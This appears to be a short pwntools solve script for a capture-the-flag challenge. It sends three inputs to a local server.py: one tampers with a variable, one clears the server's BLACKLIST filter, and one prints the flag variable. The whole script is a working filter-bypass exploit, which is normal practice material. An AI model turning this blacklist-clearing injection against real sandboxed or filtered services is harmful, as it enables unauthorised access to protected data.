from pwn import *

conn = process(["python", "server.py"])
payload1 = "M+=M"
payload2 = "BLACKLIST=''"
payload3 = "print(FLAAAAAAAAG)"
conn.sendlineafter(b"> ", payload1.encode())
conn.sendlineafter(b"> ", payload2.encode())
conn.sendlineafter(b"> ", payload3.encode())

print(conn.recvline())
